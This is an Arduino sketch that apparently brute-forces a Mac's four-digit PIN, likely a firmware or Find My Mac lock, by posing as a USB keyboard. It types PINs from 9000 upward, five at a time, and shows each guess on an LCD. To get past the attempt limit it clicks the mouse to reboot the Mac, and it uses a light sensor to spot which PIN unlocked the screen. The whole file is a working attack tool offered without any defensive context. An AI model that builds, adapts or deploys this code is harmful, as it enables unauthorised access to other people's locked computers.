#include <LiquidCrystal.h>

LiquidCrystal lcd(4,5,10,11,12,13);
int L0,L1,delta;

void setup() {
  lcd.begin(8,2);
  L0 = analogRead(0);
  Keyboard.begin();
}

void reboot_mac() 
{ 
  Mouse.move(-5000,-5000,0);
  Mouse.move(-5000,-5000,0);
  Mouse.move(-5000,-5000,0);
  Mouse.move(-5000,-5000,0);
  Mouse.move(-5000,-5000,0);
  Mouse.move(-5000,-5000,0);
  Mouse.move(0,-5000,0);
  delay(500);
  Mouse.click();
}

void loop() 
{ 
  int i = 0;
  for (int pin = 9000; pin < 9999; pin++) {
    if ( i < 5 ) {
      lcd.setCursor(0,1);
      lcd.print(pin);
      Keyboard.println(pin);
      i++;
      delay(3000);
      L1 = analogRead(0);
      delta = abs(L0 - L1);
      if (delta > 60) {
        lcd.setCursor(0,0);
        lcd.print(pin); 
        L0 = L1;    
      }
    }
    else {
      i = 0;
      reboot_mac();
      delay(75000);
      pin--;
    }
  }
}
